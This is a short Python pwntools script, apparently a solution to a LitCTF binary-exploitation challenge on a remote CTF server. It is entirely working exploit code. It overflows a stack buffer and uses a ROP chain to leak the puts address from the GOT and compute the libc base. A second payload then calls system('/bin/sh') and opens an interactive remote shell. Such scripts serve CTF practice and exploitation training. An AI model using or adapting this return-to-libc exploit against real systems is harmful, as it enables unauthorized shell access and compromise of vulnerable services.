
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = remote("node4.anna.nssctf.cn",28843)
# p = process('./LitCTF/./pwn4')
elf = ELF('./LitCTF/pwn4')
libc = ELF('./LitCTF/libc-2.31.so')
# gdb.attach(p,'b *0x400711')
padding = b'\x00' + b'A'*(0x60-0x1+0x8) 
pop_rdi = 0x4007d3
ret = 0x400556
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))
payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
p.success('base_addr --> '+ hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
system = libc_base + system
bin_sh = libc_base + bin_sh
sleep(1)
payload = padding + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
p.sendlineafter(b'Leave your message:',payload)

p.interactive()
# pause()